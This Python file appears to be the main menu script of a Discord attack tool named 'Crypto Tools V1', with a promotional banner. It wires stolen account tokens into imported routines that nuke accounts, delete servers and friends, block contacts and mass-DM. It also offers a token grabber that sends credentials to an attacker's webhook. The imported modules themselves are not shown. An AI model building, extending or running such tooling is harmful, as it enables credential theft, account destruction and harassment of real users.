from itertools import count
import os
import sys
import fade
import time
from colorama import Fore
from utils.massDM import *
from utils.closeDMs import *
from utils.tokenInfo import *
from utils.leaveServer import*
from utils.fuckAccount import *
from utils.accountNuker import *
from utils.getAllFriends import*
from utils.deleteFriends import *
from utils.deleteServers import *
from utils.createServers import *
from utils.deleteWebhook import *
from utils.DownloadToken import *
from utils.blockAllFriends import *
from utils.hypesquadChanger import *

# ========================================================================================================================================================= #

def main():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("Crypto Tools V1 | Made by ೩ Eh3an_KenZo ᶜʳʸᵖᵗᵒ | Menu")

    # ========================================================================================================================================================= #

    banner = """


                             ██████╗ ██████╗  ██╗   ██╗ ██████╗  ████████╗  ██████╗ 
                            ██╔════╝ ██╔══██╗ ╚██╗ ██╔╝ ██╔══██╗ ╚══██╔══╝ ██╔═══██╗
                            ██║      ██████╔╝  ╚████╔╝  ██████╔╝    ██║    ██║   ██║
                            ██║      ██╔══██╗   ╚██╔╝   ██╔═══╝     ██║    ██║   ██║
                            ╚██████╗ ██║  ██║    ██║    ██║         ██║    ╚██████╔╝
                             ╚═════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝         ╚═╝     ╚═════╝ 
                             
                        ╔═════════════════════════╗         ╔═════════════════════════╗
                        ║      dsc.gg/cotm        ║         ║       dsc.gg/cotm       ║
                     ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
                     ║ [1] Nuke Token                ║   ║ [10] Get All Friends          ║  
                     ║ [2] Leave Servers             ║   ║ [11] Token Info               ║
                     ║ [3] Delete Friends            ║   ║ [12] Token Checker            ║
                     ║ [4] Delete Servers            ║   ║ [13] Fuck Account             ║
                     ║ [5] Mass Dm                   ║   ║ [14] Delete Webhook           ║
                     ║ [6] Close DMs                 ║   ║ [15] Credits                  ║
                     ║ [7] Create Servers            ║   ║ [17] EXIT                     ║
                     ║ [8] Block All Friends         ║   ║                               ║
                     ║ [9] Token Grabber             ║   ║                               ║
                     ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
    """
    faded_banner = fade.greenblue(banner)
    print(faded_banner)

    # ========================================================================================================================================================= #

    info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Made by ೩ Eh3an_KenZo ᶜʳʸᵖᵗᵒ [+]"""
    for x in info:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()

# ========================================================================================================================================================= #

    choice = input(f"#{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
    if choice == "1":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        message = "@everyone Nuked By Crypto Company"
        start_nuke(token=token, content=message)
    elif choice == "2":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        leaveServer(token)
    elif choice == "3":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteFriends(token)
    elif choice == "4":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteServers(token)
    elif choice == "5":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        message = input(f"{Fore.LIGHTCYAN_EX}Message{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        massDM(token=token, content=message)
    elif choice == "6":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        close_all_dms(token=token)
    elif choice == "7":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        count = input(f"{Fore.LIGHTCYAN_EX}Count{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        name = input(f"{Fore.LIGHTCYAN_EX}Name{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        createServers(token=token, count=count, name=name)
    elif choice == "8":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        blockAllFriends(token=token)
    elif choice == "9":
        clear_banner()
        webhook = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        downloadGrabber(webhook=webhook)
    elif choice == "10":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        get_all_friends(token=token)
    elif choice == "11":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        tokenInfo(token=token)
    elif choice == "12":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        validateToken(token=token)
    elif choice == "13":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        fuckAccount(token=token)
    elif choice == "14":
        clear_banner()
        link = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteWebhook(link)
    elif choice == "15":
        socials()
    elif choice == "16":
        exit(-1)

# ========================================================================================================================================================= #

def socials():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("Crypto Tools V1 | Made by ೩ Eh3an_KenZo ᶜʳʸᵖᵗᵒ | Socials")

    banner = f"""
                                ██████╗ ██████╗  ██╗   ██╗ ██████╗  ████████╗  ██████╗ 
                               ██╔════╝ ██╔══██╗ ╚██╗ ██╔╝ ██╔══██╗ ╚══██╔══╝ ██╔═══██╗
                               ██║      ██████╔╝  ╚████╔╝  ██████╔╝    ██║    ██║   ██║
                               ██║      ██╔══██╗   ╚██╔╝   ██╔═══╝     ██║    ██║   ██║
                               ╚██████╗ ██║  ██║    ██║    ██║         ██║    ╚██████╔╝
                                ╚═════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝         ╚═╝     ╚═════╝ 
                                           ╔═════════════════════════╗      
                                           ║      dsc.gg/cotm        ║
                                           ╚═════════════════════════╝   
    """
    faded_banner = fade.greenblue(banner)
    for x in faded_banner:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()
    time.sleep(2)
    input("Press any key to continue...")

# ========================================================================================================================================================= #

while True:
    main()
